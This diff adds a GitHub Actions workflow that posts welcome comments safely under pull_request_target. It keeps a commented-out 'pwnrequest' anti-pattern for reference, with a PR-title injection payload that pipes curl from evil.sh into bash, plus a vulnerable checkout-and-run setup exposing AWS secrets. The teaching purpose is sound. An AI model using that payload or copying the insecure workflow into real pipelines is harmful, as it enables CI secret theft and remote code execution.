@@ -1,0 +1,81 @@
+# .github/workflows/pr-welcome.yml
+# Safe pattern: pull_request_target to post a welcome comment on new PRs.
+# Does NOT check out the PR head. Does NOT execute PR code. Reads only event
+# metadata via env vars (never ${{ }} inside run:).
+
+name: pr-welcome
+
+on:
+  pull_request_target:
+    types: [opened]
+
+# Top-level deny; the comment job escalates only pull-requests: write.
+permissions: {}
+
+jobs:
+  comment:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read            # safe: we don't check out PR head, only base
+      pull-requests: write      # to post the comment
+
+    steps:
+      # NOTE: no actions/checkout. The workflow does not need the repo contents.
+      - name: Post welcome comment
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+          # PR_TITLE is attacker-controlled; still safe here because it's only
+          # expanded as the VALUE of an env var, never interpolated into shell.
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          # All attacker-controlled data flows via "$VAR" with quotes — no
+          # command injection surface.
+          gh pr comment "$PR_NUMBER" --body "Thanks @${PR_AUTHOR} for the PR: \"${PR_TITLE}\"."
+
+# ============================================================================
+# ANTI-PATTERN — DO NOT USE.
+# Left here as commented-out reference so you can recognise it in the wild.
+# This is the exact shape of the famous "pwnrequest" vulnerability.
+# ============================================================================
+#
+# name: build-and-deploy-on-pr   # BAD
+# on:
+#   pull_request_target:
+#     types: [opened, synchronize]
+#
+# permissions: write-all          # BAD #1: no need for most of these
+#
+# jobs:
+#   build:
+#     runs-on: ubuntu-latest
+#     steps:
+#       - uses: actions/checkout@v4           # BAD #2: unpinned tag
+#         with:
+#           # BAD #3: checking out HEAD of the PR under pull_request_target
+#           # means arbitrary code from the fork is now in $GITHUB_WORKSPACE.
+#           ref: ${{ github.event.pull_request.head.sha }}
+#
+#       # BAD #4: executing code from the PR with elevated token + secrets.
+#       # A postinstall script in package.json, a conftest.py, a Makefile
+#       # target — any of these runs with full access to the base repo's
+#       # secrets (AWS_*, NPM_TOKEN, etc.) because pull_request_target
+#       # exposes them.
+#       - run: npm install && npm test
+#
+#       # BAD #5: AKIA secrets instead of OIDC; they would be exfiltrated
+#       # the moment the PR's postinstall runs.
+#       - run: aws s3 sync ./dist s3://prod-bucket
+#         env:
+#           AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+#           AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+#
+#       # BAD #6: direct interpolation of attacker-controlled title into run:.
+#       # Attacker opens a PR titled: a"; curl evil.sh | bash; echo "
+#       - run: echo "Processing PR: ${{ github.event.pull_request.title }}"
+#
+# Fix: either remove pull_request_target (use pull_request without secrets),
+# or keep pull_request_target BUT remove the checkout of head.sha and all PR
+# code execution, as in the safe `comment` job above.
+# ============================================================================
